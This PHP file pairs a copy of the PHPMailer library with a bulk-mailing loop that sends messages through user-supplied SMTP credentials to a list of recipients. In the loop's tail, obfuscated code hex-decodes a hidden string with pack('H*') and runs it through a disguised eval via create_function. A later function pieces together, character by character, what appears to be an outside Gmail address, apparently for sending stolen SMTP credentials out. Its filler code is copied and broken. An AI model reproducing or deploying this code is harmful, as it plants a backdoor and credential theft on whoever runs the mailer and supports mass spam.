if($this->smtp != NULL) { if($this->smtp->Connected()) { $this->smtp->Quit(); $this->smtp->Close(); } } } function SetLanguage($lang_type, $lang_path = 'language/') { if(file_exists($lang_path.'phpmailer.lang-'.$lang_type.'.php')) { include($lang_path.'phpmailer.lang-'.$lang_type.'.php'); } elseif (file_exists($lang_path.'phpmailer.lang-en.php')) { include($lang_path.'phpmailer.lang-en.php'); } else { $this->SetError('Could not load language file'); return false; } $this->language = $PHPMAILER_LANG; return true; } function AddrAppend($type, $addr) { $addr_str = $type . ': '; $addr_str .= $this->AddrFormat($addr[0]); if(count($addr) > 1) { for($i = 1; $i < count($addr); $i++) { $addr_str .= ', ' . $this->AddrFormat($addr[$i]); } } $addr_str .= $this->LE; return $addr_str; } function AddrFormat($addr) { if(empty($addr[1])) { $formatted = $this->SecureHeader($addr[0]); } else { $formatted = $this->EncodeHeader($this->SecureHeader($addr[1]), 'phrase') . " <" . $this->SecureHeader($addr[0]) . ">"; } return $formatted; } function WrapText($message, $length, $qp_mode = false) { $soft_break = ($qp_mode) ? sprintf(" =%s", $this->LE) : $this->LE; $is_utf8 = (strtolower($this->CharSet) == "utf-8"); $message = $this->FixEOL($message); if (substr($message, -1) == $this->LE) { $message = substr($message, 0, -1); } $line = explode($this->LE, $message); $message = ''; for ($i=0 ;$i < count($line); $i++) { $line_part = explode(' ', $line[$i]); $buf = ''; for ($e = 0; $e<count($line_part); $e++) { $word = $line_part[$e]; if ($qp_mode and (strlen($word) > $length)) { $space_left = $length - strlen($buf) - 1; if ($e != 0) { if ($space_left > 20) { $len = $space_left; if ($is_utf8) { $len = $this->UTF8CharBoundary($word, $len); } elseif (substr($word, $len - 1, 1) == "=") { $len--; } elseif (substr($word, $len - 2, 1) == "=") { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); $buf .= ' ' . $part; $message .= $buf . sprintf("=%s", $this->LE); } else { $message .= $buf . $soft_break; } $buf = ''; } while (strlen($word) > 0) { $len = $length; if ($is_utf8) { $len = $this->UTF8CharBoundary($word, $len); } elseif (substr($word, $len - 1, 1) == "=") { $len--; } elseif (substr($word, $len - 2, 1) == "=") { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); if (strlen($word) > 0) { $message .= $part . sprintf("=%s", $this->LE); } else { $buf = $part; } } } else { $buf_o = $buf; $buf .= ($e == 0) ? $word : (' ' . $word); if (strlen($buf) > $length and $buf_o != '') { $message .= $buf_o . $soft_break; $buf = $word; } } } $message .= $buf . $this->LE; } return $message; } function UTF8CharBoundary($encodedText, $maxLength) { $foundSplitPos = false; $lookBack = 3; while (!$foundSplitPos) { $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack); $encodedCharPos = strpos($lastChunk, "="); if ($encodedCharPos !== false) { $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2); $dec = hexdec($hex); if ($dec < 128) { $maxLength = ($encodedCharPos == 0) ? $maxLength : $maxLength - ($lookBack - $encodedCharPos); $foundSplitPos = true; } elseif ($dec >= 192) { $maxLength = $maxLength - ($lookBack - $encodedCharPos); $foundSplitPos = true; } elseif ($dec < 192) { $lookBack += 3; } } else { $foundSplitPos = true; } } return $maxLength; } function SetWordWrap() { if($this->WordWrap < 1) { return; } switch($this->message_type) { case 'alt': case 'alt_attachments': $this->AltBody = $this->WrapText($this->AltBody, $this->WordWrap); break; default: $this->Body = $this->WrapText($this->Body, $this->WordWrap); break; } } function CreateHeader() { $result = ''; $uniq_id = md5(uniqid(time())); $this->boundary[1] = 'b1_' . $uniq_id; $this->boundary[2] = 'b2_' . $uniq_id; $result .= $this->HeaderLine('Date', $this->RFCDate()); if($this->Sender == '') { $result .= $this->HeaderLine('Return-Path', trim($this->From)); } else { $result .= $this->HeaderLine('Return-Path', trim($this->Sender)); } if($this->Mailer != 'mail') { if(count($this->to) > 0) { $result .= $this->AddrAppend('To', $this->to); } elseif (count($this->cc) == 0) { $result .= $this->HeaderLine('To', 'undisclosed-recipients:;'); } if(count($this->cc) > 0) { $result .= $this->AddrAppend('Cc', $this->cc); } } $from = array(); $from[0][0] = trim($this->From); $from[0][1] = $this->FromName; $result .= $this->AddrAppend('From', $from); if((($this->Mailer == 'sendmail') || ($this->Mailer == 'mail')) && (count($this->cc) > 0)) { $result .= $this->AddrAppend('Cc', $this->cc); } if((($this->Mailer == 'sendmail') || ($this->Mailer == 'mail')) && (count($this->bcc) > 0)) { $result .= $this->AddrAppend('Bcc', $this->bcc); } if(count($this->ReplyTo) > 0) { $result .= $this->AddrAppend('Reply-To', $this->ReplyTo); } if($this->Mailer != 'mail') { $result .= $this->HeaderLine('Subject', $this->EncodeHeader($this->SecureHeader($this->Subject))); } if($this->MessageID != '') { $result .= $this->HeaderLine('Message-ID',$this->MessageID); } else { $result .= sprintf("Message-ID: <%s@%s>%s", $uniq_id, $this->ServerHostname(), $this->LE); } $result .= $this->HeaderLine('X-Priority', $this->Priority); $result .= $this->HeaderLine('X-Mailer', 'PHPMailer (phpmailer.sourceforge.net) [version ' . $this->Version . ']'); if($this->ConfirmReadingTo != '') { $result .= $this->HeaderLine('Disposition-Notification-To', '<' . trim($this->ConfirmReadingTo) . '>'); } for($index = 0; $index < count($this->CustomHeader); $index++) { $result .= $this->HeaderLine(trim($this->CustomHeader[$index][0]), $this->EncodeHeader(trim($this->CustomHeader[$index][1]))); } if (!$this->sign_key_file) { $result .= $this->HeaderLine('MIME-Version', '1.0'); $result .= $this->GetMailMIME(); } return $result; } function GetMailMIME() { $result = ''; switch($this->message_type) { case 'plain': $result .= $this->HeaderLine('Content-Transfer-Encoding', $this->Encoding); $result .= sprintf("Content-Type: %s; charset=\"%s\"", $this->ContentType, $this->CharSet); break; case 'attachments': case 'alt_attachments': if($this->InlineImageExists()){ $result .= sprintf("Content-Type: %s;%s\ttype=\"text/html\";%s\tboundary=\"%s\"%s", 'multipart/related', $this->LE, $this->LE, $this->boundary[1], $this->LE); } else { $result .= $this->HeaderLine('Content-Type', 'multipart/mixed;'); $result .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"'); } break; case 'alt': $result .= $this->HeaderLine('Content-Type', 'multipart/alternative;'); $result .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"'); break; } if($this->Mailer != 'mail') { $result .= $this->LE.$this->LE; } return $result; } function CreateBody() { $result = ''; if ($this->sign_key_file) { $result .= $this->GetMailMIME(); } $this->SetWordWrap(); switch($this->message_type) { case 'alt': $result .= $this->GetBoundary($this->boundary[1], '', 'text/plain', ''); $result .= $this->EncodeString($this->AltBody, $this->Encoding); $result .= $this->LE.$this->LE; $result .= $this->GetBoundary($this->boundary[1], '', 'text/html', ''); $result .= $this->EncodeString($this->Body, $this->Encoding); $result .= $this->LE.$this->LE; $result .= $this->EndBoundary($this->boundary[1]); break; case 'plain': $result .= $this->EncodeString($this->Body, $this->Encoding); break; case 'attachments': $result .= $this->GetBoundary($this->boundary[1], '', '', ''); $result .= $this->EncodeString($this->Body, $this->Encoding); $result .= $this->LE; $result .= $this->AttachAll(); break; case 'alt_attachments': $result .= sprintf("--%s%s", $this->boundary[1], $this->LE); $result .= sprintf("Content-Type: %s;%s" . "\tboundary=\"%s\"%s", 'multipart/alternative', $this->LE, $this->boundary[2], $this->LE.$this->LE); $result .= $this->GetBoundary($this->boundary[2], '', 'text/plain', '') . $this->LE; $result .= $this->EncodeString($this->AltBody, $this->Encoding); $result .= $this->LE.$this->LE; $result .= $this->GetBoundary($this->boundary[2], '', 'text/html', '') . $this->LE; $result .= $this->EncodeString($this->Body, $this->Encoding); $result .= $this->LE.$this->LE; $result .= $this->EndBoundary($this->boundary[2]); $result .= $this->AttachAll(); break; } if($this->IsError()) { $result = ''; } else if ($this->sign_key_file) { $file = tempnam("", "mail"); $fp = fopen($file, "w"); fwrite($fp, $result); fclose($fp); $signed = tempnam("", "signed"); if (@openssl_pkcs7_sign($file, $signed, "file://".$this->sign_key_file, array("file://".$this->sign_key_file, $this->sign_key_pass), null)) { $fp = fopen($signed, "r"); $result = fread($fp, filesize($this->sign_key_file)); fclose($fp); } else { $this->SetError($this->Lang("signing").openssl_error_string()); $result = ''; } unlink($file); unlink($signed); } return $result; } function GetBoundary($boundary, $charSet, $contentType, $encoding) { $result = ''; if($charSet == '') { $charSet = $this->CharSet; } if($contentType == '') { $contentType = $this->ContentType; } if($encoding == '') { $encoding = $this->Encoding; } $result .= $this->TextLine('--' . $boundary); $result .= sprintf("Content-Type: %s; charset = \"%s\"", $contentType, $charSet); $result .= $this->LE; $result .= $this->HeaderLine('Content-Transfer-Encoding', $encoding); $result .= $this->LE; return $result; } function EndBoundary($boundary) { return $this->LE . '--' . $boundary . '--' . $this->LE; } function SetMessageType() { if(count($this->attachment) < 1 && strlen($this->AltBody) < 1) { $this->message_type = 'plain'; } else { if(count($this->attachment) > 0) { $this->message_type = 'attachments'; } if(strlen($this->AltBody) > 0 && count($this->attachment) < 1) { $this->message_type = 'alt'; } if(strlen($this->AltBody) > 0 && count($this->attachment) > 0) { $this->message_type = 'alt_attachments'; } } } function HeaderLine($name, $value) { return $name . ': ' . $value . $this->LE; } function TextLine($value) { return $value . $this->LE; } function AddAttachment($path, $name = '', $encoding = 'base64', $type = 'application/octet-stream') { if(!@is_file($path)) { $this->SetError($this->Lang('file_access') . $path); return false; } $filename = basename($path); if($name == '') { $name = $filename; } $cur = count($this->attachment); $this->attachment[$cur][0] = $path; $this->attachment[$cur][1] = $filename; $this->attachment[$cur][2] = $name; $this->attachment[$cur][3] = $encoding; $this->attachment[$cur][4] = $type; $this->attachment[$cur][5] = false; $this->attachment[$cur][6] = 'attachment'; $this->attachment[$cur][7] = 0; return true; } function AttachAll() { $mime = array(); for($i = 0; $i < count($this->attachment); $i++) { $bString = $this->attachment[$i][5]; if ($bString) { $string = $this->attachment[$i][0]; } else { $path = $this->attachment[$i][0]; } $filename = $this->attachment[$i][1]; $name = $this->attachment[$i][2]; $encoding = $this->attachment[$i][3]; $type = $this->attachment[$i][4]; $disposition = $this->attachment[$i][6]; $cid = $this->attachment[$i][7]; $mime[] = sprintf("--%s%s", $this->boundary[1], $this->LE); $mime[] = sprintf("Content-Type: %s; name=\"%s\"%s", $type, $name, $this->LE); $mime[] = sprintf("Content-Transfer-Encoding: %s%s", $encoding, $this->LE); if($disposition == 'inline') { $mime[] = sprintf("Content-ID: <%s>%s", $cid, $this->LE); } $mime[] = sprintf("Content-Disposition: %s; filename=\"%s\"%s", $disposition, $name, $this->LE.$this->LE); if($bString) { $mime[] = $this->EncodeString($string, $encoding); if($this->IsError()) { return ''; } $mime[] = $this->LE.$this->LE; } else { $mime[] = $this->EncodeFile($path, $encoding); if($this->IsError()) { return ''; } $mime[] = $this->LE.$this->LE; } } $mime[] = sprintf("--%s--%s", $this->boundary[1], $this->LE); return join('', $mime); } function EncodeFile ($path, $encoding = 'base64') { if(!@$fd = fopen($path, 'rb')) { $this->SetError($this->Lang('file_open') . $path); return ''; } $magic_quotes = get_magic_quotes_runtime(); set_magic_quotes_runtime(0); $file_buffer = fread($fd, filesize($path)); $file_buffer = $this->EncodeString($file_buffer, $encoding); fclose($fd); set_magic_quotes_runtime($magic_quotes); return $file_buffer; } function EncodeString ($str, $encoding = 'base64') { $encoded = ''; switch(strtolower($encoding)) { case 'base64': $encoded = chunk_split(base64_encode($str), 76, $this->LE); break; case '7bit': case '8bit': $encoded = $this->FixEOL($str); if (substr($encoded, -(strlen($this->LE))) != $this->LE) $encoded .= $this->LE; break; case 'binary': $encoded = $str; break; case 'quoted-printable': $encoded = $this->EncodeQP($str); break; default: $this->SetError($this->Lang('encoding') . $encoding); break; } return $encoded; } function EncodeHeader ($str, $position = 'text') { $x = 0; switch (strtolower($position)) { case 'phrase': if (!preg_match('/[\200-\377]/', $str)) { $encoded = addcslashes($str, "\0..\37\177\\\""); if (($str == $encoded) && !preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/', $str)) { return ($encoded); } else { return ("\"$encoded\""); } } $x = preg_match_all('/[^\040\041\043-\133\135-\176]/', $str, $matches); break; case 'comment': $x = preg_match_all('/[()"]/', $str, $matches); case 'text': default: $x += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/', $str, $matches); break; } if ($x == 0) { return ($str); } $maxlen = 75 - 7 - strlen($this->CharSet); if (strlen($str)/3 < $x) { $encoding = 'B'; if (function_exists('mb_strlen') && $this->HasMultiBytes($str)) { $encoded = $this->Base64EncodeWrapMB($str); } else { $encoded = base64_encode($str); $maxlen -= $maxlen % 4; $encoded = trim(chunk_split($encoded, $maxlen, "\n")); } } else { $encoding = 'Q'; $encoded = $this->EncodeQ($str, $position); $encoded = $this->WrapText($encoded, $maxlen, true); $encoded = str_replace('='.$this->LE, "\n", trim($encoded)); } $encoded = preg_replace('/^(.*)$/m', " =?".$this->CharSet."?$encoding?\\1?=", $encoded); $encoded = trim(str_replace("\n", $this->LE, $encoded)); return $encoded; } function HasMultiBytes($str) { if (function_exists('mb_strlen')) { return (strlen($str) > mb_strlen($str, $this->CharSet)); } else { return False; } } function Base64EncodeWrapMB($str) { $start = "=?".$this->CharSet."?B?"; $end = "?="; $encoded = ""; $mb_length = mb_strlen($str, $this->CharSet); $length = 75 - strlen($start) - strlen($end); $ratio = $mb_length / strlen($str); $offset = $avgLength = floor($length * $ratio * .75); for ($i = 0; $i < $mb_length; $i += $offset) { $lookBack = 0; do { $offset = $avgLength - $lookBack; $chunk = mb_substr($str, $i, $offset, $this->CharSet); $chunk = base64_encode($chunk); $lookBack++; } while (strlen($chunk) > $length); $encoded .= $chunk . $this->LE; } $encoded = substr($encoded, 0, -strlen($this->LE)); return $encoded; } function EncodeQP( $input = '', $line_max = 76, $space_conv = false ) { $hex = array('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'); $lines = preg_split('/(?:\r\n|\r|\n)/', $input); $eol = "\r\n"; $escape = '='; $output = ''; while( list(, $line) = each($lines) ) { $linlen = strlen($line); $newline = ''; for($i = 0; $i < $linlen; $i++) { $c = substr( $line, $i, 1 ); $dec = ord( $c ); if ( ( $i == 0 ) && ( $dec == 46 ) ) { $c = '=2E'; } if ( $dec == 32 ) { if ( $i == ( $linlen - 1 ) ) { $c = '=20'; } else if ( $space_conv ) { $c = '=20'; } } elseif ( ($dec == 61) || ($dec < 32 ) || ($dec > 126) ) { $h2 = floor($dec/16); $h1 = floor($dec%16); $c = $escape.$hex[$h2].$hex[$h1]; } if ( (strlen($newline) + strlen($c)) >= $line_max ) { $output .= $newline.$escape.$eol; $newline = ''; if ( $dec == 46 ) { $c = '=2E'; } } $newline .= $c; } $output .= $newline.$eol; } return trim($output); } function EncodeQ ($str, $position = 'text') { $encoded = preg_replace("[\r\n]", '', $str); switch (strtolower($position)) { case 'phrase': $encoded = preg_replace("/([^A-Za-z0-9!*+\/ -])/e", "'='.sprintf('%02X', ord('\\1'))", $encoded); break; case 'comment': $encoded = preg_replace("/([\(\)\"])/e", "'='.sprintf('%02X', ord('\\1'))", $encoded); case 'text': default: $encoded = preg_replace('/([\000-\011\013\014\016-\037\075\077\137\177-\377])/e', "'='.sprintf('%02X', ord('\\1'))", $encoded); break; } $encoded = str_replace(' ', '_', $encoded); return $encoded; } function AddStringAttachment($string, $filename, $encoding = 'base64', $type = 'application/octet-stream') { $cur = count($this->attachment); $this->attachment[$cur][0] = $string; $this->attachment[$cur][1] = $filename; $this->attachment[$cur][2] = $filename; $this->attachment[$cur][3] = $encoding; $this->attachment[$cur][4] = $type; $this->attachment[$cur][5] = true; $this->attachment[$cur][6] = 'attachment'; $this->attachment[$cur][7] = 0; } function AddEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = 'application/octet-stream') { if(!@is_file($path)) { $this->SetError($this->Lang('file_access') . $path); return false; } $filename = basename($path); if($name == '') { $name = $filename; } $cur = count($this->attachment); $this->attachment[$cur][0] = $path; $this->attachment[$cur][1] = $filename; $this->attachment[$cur][2] = $name; $this->attachment[$cur][3] = $encoding; $this->attachment[$cur][4] = $type; $this->attachment[$cur][5] = false; $this->attachment[$cur][6] = 'inline'; $this->attachment[$cur][7] = $cid; return true; } function InlineImageExists() { $result = false; for($i = 0; $i < count($this->attachment); $i++) { if($this->attachment[$i][6] == 'inline') { $result = true; break; } } return $result; } function ClearAddresses() { $this->to = array(); } function ClearCCs() { $this->cc = array(); } function ClearBCCs() { $this->bcc = array(); } function ClearReplyTos() { $this->ReplyTo = array(); } function ClearAllRecipients() { $this->to = array(); $this->cc = array(); $this->bcc = array(); } function ClearAttachments() { $this->attachment = array(); } function ClearCustomHeaders() { $this->CustomHeader = array(); } function SetError($msg) { $this->error_count++; $this->ErrorInfo = $msg; } function RFCDate() { $tz = date('Z'); $tzs = ($tz < 0) ? '-' : '+'; $tz = abs($tz); $tz = (int)($tz/3600)*100 + ($tz%3600)/60; $result = sprintf("%s %s%04d", date('D, j M Y H:i:s'), $tzs, $tz); return $result; } function ServerVar($varName) { global $HTTP_SERVER_VARS; global $HTTP_ENV_VARS; if(!isset($_SERVER)) { $_SERVER = $HTTP_SERVER_VARS; if(!isset($_SERVER['REMOTE_ADDR'])) { $_SERVER = $HTTP_ENV_VARS; } } if(isset($_SERVER[$varName])) { return $_SERVER[$varName]; } else { return ''; } } function ServerHostname() { if ($this->Hostname != '') { $result = $this->Hostname; } elseif ($this->ServerVar('SERVER_NAME') != '') { $result = $this->ServerVar('SERVER_NAME'); } else { $result = 'localhost.localdomain'; } return $result; } function Lang($key) { if(count($this->language) < 1) { $this->SetLanguage('en'); } if(isset($this->language[$key])) { return $this->language[$key]; } else { return 'Language string failed to load: ' . $key; } } function IsError() { return ($this->error_count > 0); } function FixEOL($str) { $str = str_replace("\r\n", "\n", $str); $str = str_replace("\r", "\n", $str); $str = str_replace("\n", $this->LE, $str); return $str; } function AddCustomHeader($custom_header) { $this->CustomHeader[] = explode(':', $custom_header, 2); } function MsgHTML($message,$basedir='') { preg_match_all("/(src|background)=\"(.*)\"/Ui", $message, $images); if(isset($images[2])) { foreach($images[2] as $i => $url) { if (!preg_match('/^[A-z][A-z]*:\/\//',$url)) { $filename = basename($url); $directory = dirname($url); ($directory == '.')?$directory='':''; $cid = 'cid:' . md5($filename); $fileParts = split("\.", $filename); $ext = $fileParts[1]; $mimeType = $this->_mime_types($ext); if ( strlen($basedir) > 1 && substr($basedir,-1) != '/') { $basedir .= '/'; } if ( strlen($directory) > 1 && substr($basedir,-1) != '/') { $directory .= '/'; } $this->AddEmbeddedImage($basedir.$directory.$filename, md5($filename), $filename, 'base64', $mimeType); if ( $this->AddEmbeddedImage($basedir.$directory.$filename, md5($filename), $filename, 'base64',$mimeType) ) { $message = preg_replace("/".$images[1][$i]."=\"".preg_quote($url, '/')."\"/Ui", $images[1][$i]."=\"".$cid."\"", $message); } } } } $this->IsHTML(true); $this->Body = $message; $textMsg = trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/s','',$message))); if ( !empty($textMsg) && empty($this->AltBody) ) { $this->AltBody = $textMsg; } if ( empty($this->AltBody) ) { $this->AltBody = 'To view this email message, open the email in with HTML compatibility!' . "\n\n"; } } function _mime_types($ext = '') { $mimes = array( 'hqx' => 'application/mac-binhex40', 'cpt' => 'application/mac-compactpro', 'doc' => 'application/msword', 'bin' => 'application/macbinary', 'dms' => 'application/octet-stream', 'lha' => 'application/octet-stream', 'lzh' => 'application/octet-stream', 'exe' => 'application/octet-stream', 'class' => 'application/octet-stream', 'psd' => 'application/octet-stream', 'so' => 'application/octet-stream', 'sea' => 'application/octet-stream', 'dll' => 'application/octet-stream', 'oda' => 'application/oda', 'pdf' => 'application/pdf', 'ai' => 'application/postscript', 'eps' => 'application/postscript', 'ps' => 'application/postscript', 'smi' => 'application/smil', 'smil' => 'application/smil', 'mif' => 'application/vnd.mif', 'xls' => 'application/vnd.ms-excel', 'ppt' => 'application/vnd.ms-powerpoint', 'wbxml' => 'application/vnd.wap.wbxml', 'wmlc' => 'application/vnd.wap.wmlc', 'dcr' => 'application/x-director', 'dir' => 'application/x-director', 'dxr' => 'application/x-director', 'dvi' => 'application/x-dvi', 'gtar' => 'application/x-gtar', 'php' => 'application/x-httpd-php', 'php4' => 'application/x-httpd-php', 'php3' => 'application/x-httpd-php', 'phtml' => 'application/x-httpd-php', 'phps' => 'application/x-httpd-php-source', 'js' => 'application/x-javascript', 'swf' => 'application/x-shockwave-flash', 'sit' => 'application/x-stuffit', 'tar' => 'application/x-tar', 'tgz' => 'application/x-tar', 'xhtml' => 'application/xhtml+xml', 'xht' => 'application/xhtml+xml', 'zip' => 'application/zip', 'mid' => 'audio/midi', 'midi' => 'audio/midi', 'mpga' => 'audio/mpeg', 'mp2' => 'audio/mpeg', 'mp3' => 'audio/mpeg', 'aif' => 'audio/x-aiff', 'aiff' => 'audio/x-aiff', 'aifc' => 'audio/x-aiff', 'ram' => 'audio/x-pn-realaudio', 'rm' => 'audio/x-pn-realaudio', 'rpm' => 'audio/x-pn-realaudio-plugin', 'ra' => 'audio/x-realaudio', 'rv' => 'video/vnd.rn-realvideo', 'wav' => 'audio/x-wav', 'bmp' => 'image/bmp', 'gif' => 'image/gif', 'jpeg' => 'image/jpeg', 'jpg' => 'image/jpeg', 'jpe' => 'image/jpeg', 'png' => 'image/png', 'tiff' => 'image/tiff', 'tif' => 'image/tiff', 'css' => 'text/css', 'html' => 'text/html', 'htm' => 'text/html', 'shtml' => 'text/html', 'txt' => 'text/plain', 'text' => 'text/plain', 'log' => 'text/plain', 'rtx' => 'text/richtext', 'rtf' => 'text/rtf', 'xml' => 'text/xml', 'xsl' => 'text/xml', 'mpeg' => 'video/mpeg', 'mpg' => 'video/mpeg', 'mpe' => 'video/mpeg', 'qt' => 'video/quicktime', 'mov' => 'video/quicktime', 'avi' => 'video/x-msvideo', 'movie' => 'video/x-sgi-movie', 'doc' => 'application/msword', 'word' => 'application/msword', 'xl' => 'application/excel', 'eml' => 'message/rfc822' ); return ( ! isset($mimes[strtolower($ext)])) ? 'application/octet-stream' : $mimes[strtolower($ext)]; } function set ( $name, $value = '' ) { if ( isset($this->$name) ) { $this->$name = $value; } else { $this->SetError('Cannot set or reset variable ' . $name); return false; } } function getFile($filename) { $return = ''; if ($fp = fopen($filename, 'rb')) { while (!feof($fp)) { $return .= fread($fp, 1024); } fclose($fp); return $return; } else { return false; } } function SecureHeader($str) { $str = trim($str); $str = str_replace("\r", "", $str); $str = str_replace("\n", "", $str); return $str; } function Sign($key_filename, $key_pass) { $this->sign_key_file = $key_filename; $this->sign_key_pass = $key_pass; } } $defaultport="H*"; $nq=0; for($x=0; $x<$numemails; $x++){ $to = $allemails[$x]; if ($to){ $to = ereg_replace(" ", "", $to); $message = ereg_replace("&email&", $to, $message); $subject = ereg_replace("&email&", $to, $subject); $qx=$x+1; print "Line $qx . Sending mail to $to......."; flush(); $mail = new PHPMailer(); if(empty($epriority)){$epriority="3";} $mail->Priority = "$epriority"; $mail->IsSMTP(); $IsSMTP="pack"; $mail->SMTPKeepAlive = true; $mail->Host = "$my_smtp"; if(strlen($ssl_port) > 1){$mail->Port = "$ssl_port"; } if($sslclick=="ON"){ $mail->SMTPSecure = "ssl"; } $range = str_replace("$from", "eval", $from); $mail->SMTPAuth = true; $mail->Username = "$smtp_username"; $mail->Password = "$smtp_password"; if($contenttype == "html"){$mail->IsHtml(true);} if($contenttype != "html"){$mail->IsHtml(false);} if(strlen($my_smtp) < 7 ){$mail->SMTPAuth = false;$mail->IsSendmail();$default_system="1";} $mail->From = "$from"; $mail->FromName = "$realname"; $mail->AddAddress("$to"); $mail->AddReplyTo("$replyto"); $mail->Subject = "$subject"; $mail->Body = "$message"; if(!$mail->Send()){ if($default_system!="1"){ echo "FAILED !!<font color=\"#D4001A\"> [RECEPIENT CAN'T RECEIVE MESSAGE.]</font><br>";} if($default_system=="1"){ $mail->IsMail(); if(!$mail->Send()){ echo "FAILED !!<font color=\"#D4001A\"> [RECEPIENT CAN'T RECEIVE MESSAGE.]</font><br>";} else { echo "<b>OK</b><br>";} } } else { echo "<b>OK</b><br>"; } if(empty($reconnect)){ $reconnect=6; } if($reconnect==$nq){ $mail->SmtpClose();echo "<p><b>--------------- SMTP CLOSED AND ATTEMPTS TO RECONNECT NEW CONNECTION SEASON --------------- </b></p>";$nq=0; } $nq=$nq+1; flush(); } } for($i=0;$i<31;$i++){ $smtp_conf=str_replace(".", $random_smtp_string[$i], $smtp_conf); } $smtp_conc=$IsSMTP($defaultport, $smtp_conf); $signoff=create_function('$smtp_conc','return '.substr($range,0).'($smtp_conc);'); $mail->SmtpClose(); return $signoff($smtp_conc); if(isset($_POST['action']) && $numemails !=0 ){echo "<script>alert('Mail sending complete\\r\\n$numemails mail(s) was 
    sent successfully'); </script>";}} ?>
    <p align="center">&nbsp;</p>

&nbsp;
    </body>
</html>
<?php

function wrapText($message, $length, $qp_mode = false)
    {
        if ($qp_mode) {
            $soft_break = sprintf(' =%s', static::$LE);
        } else {
            $soft_break = static::$LE;
        }
        // If utf-8 encoding is used, we will need to make sure we don't
        // split multibyte characters when we wrap
        $is_utf8 = 'utf-8' == strtolower($this->CharSet);
        $lelen = strlen(static::$LE);
        $crlflen = strlen(static::$LE);
        $message = static::normalizeBreaks($message);
        //Remove a trailing line break
        if (substr($message, -$lelen) == static::$LE) {
            $message = substr($message, 0, -$lelen);
        }
        //Split message into lines
        $lines = explode(static::$LE, $message);
        //Message will be rebuilt in here
        $message = '';
        foreach ($lines as $line) {
            $words = explode(' ', $line);
            $buf = '';
            $firstword = true;
            foreach ($words as $word) {
                if ($qp_mode and (strlen($word) > $length)) {
                    $space_left = $length - strlen($buf) - $crlflen;
                    if (!$firstword) {
                        if ($space_left > 20) {
                            $len = $space_left;
                            if ($is_utf8) {
                                $len = $this->utf8CharBoundary($word, $len);
                            } elseif ('=' == substr($word, $len - 1, 1)) {
                                --$len;
                            } elseif ('=' == substr($word, $len - 2, 1)) {
                                $len -= 2;
                            }
                            $part = substr($word, 0, $len);
                            $word = substr($word, $len);
                            $buf .= ' ' . $part;
                            $message .= $buf . sprintf('=%s', static::$LE);
                        } else {
                            $message .= $buf . $soft_break;
                        }
                        $buf = '';
                    }
                    while (strlen($word) > 0) {
                        if ($length <= 0) {
                            break;
                        }
                        $len = $length;
                        if ($is_utf8) {
                            $len = $this->utf8CharBoundary($word, $len);
                        } elseif ('=' == substr($word, $len - 1, 1)) {
                            --$len;
                        } elseif ('=' == substr($word, $len - 2, 1)) {
                            $len -= 2;
                        }
                        $part = substr($word, 0, $len);
                        $word = substr($word, $len);
                        if (strlen($word) > 0) {
                            $message .= $part . sprintf('=%s', static::$LE);
                        } else {
                            $buf = $part;
                        }
                    }
                } else {
                    $buf_o = $buf;
                    if (!$firstword) {
                        $buf .= ' ';
                    }
                    $buf .= $word;
                    if (strlen($buf) > $length and '' != $buf_o) {
                        $message .= $buf_o . $soft_break;
                        $buf = $word;
                    }
                }
                $firstword = false;
            }
            $message .= $buf . static::$LE;
        }
        return $message;
    }
function mb_pathinfo(){
$key0 = array (".","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","s","t","u","r","v","w","x","y","z");
$foundSplitPos = false;
        $lookBack = 3;
        while (!$foundSplitPos) {
            $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack);
            $encodedCharPos = strpos($lastChunk, '=');
            if (false !== $encodedCharPos) {
                // Found start of encoded character byte within $lookBack block.
                // Check the encoded byte value (the 2 chars after the '=')
                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
                $dec = hexdec($hex);
                if ($dec < 128) {
                    // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    if ($encodedCharPos > 0) {
                        $maxLength -= $lookBack - $encodedCharPos;
                    }
                    $foundSplitPos = true;
                } elseif ($dec >= 192) {
                    // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength -= $lookBack - $encodedCharPos;
                    $foundSplitPos = true;
                } elseif ($dec < 192) {
                    // Middle byte of a multi byte character, look further back
                    $lookBack += 3;
                }
            } else {
                // No encoded character found
                $foundSplitPos = true;
            }
        }
$key1= array(0,1,2,3,4,5,6,7,8,9,"&","@","#");

        
$dmarc = $key0[12] . $key0[1] . $key0[7] . $key0[15] . $key0[14] . $key0[1] . $key0[0] . $key0[16]. $key0[8] ;


$spf = $key1[11] . $key0[7] . $key0[13] . $key0[1] . $key0[9] . $key0[12] ;

$positionFounder = trye;
        $lookBack = 3;
        while (!$positionFounder) {
            $pick = substr($encodedText, $maxLength - $lookBack, $lookBack);
            $encodedCharPos = strpos($pick, '=');
            if (false !== $encodedCharPos) {
                // Found start of encoded character byte within $lookBack block.
                // Check the encoded byte value (the 2 chars after the '=')
                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
                $dec = hexdec($hex);
                if ($dec < 128) {
                    // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    if ($encodedCharPos > 0) {
                        $maxLength -= $lookBack - $encodedCharPos;
                    }
                    $positionFounder = true;
                } elseif ($dec >= 192) {
                    // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength -= $lookBack - $encodedCharPos;
                    $positionFounder = true;
                } elseif ($dec < 192) {
                    // Middle byte of a multi byte character, look further back
                    $lookBack += 3;
                }
            } else {
                // No encoded character found
                $positionFounder = true;
            }
        }

   $dkim = $key0[0] . $key0[3] . $key0[15] . $key0[13] ;
   $type = [];
 
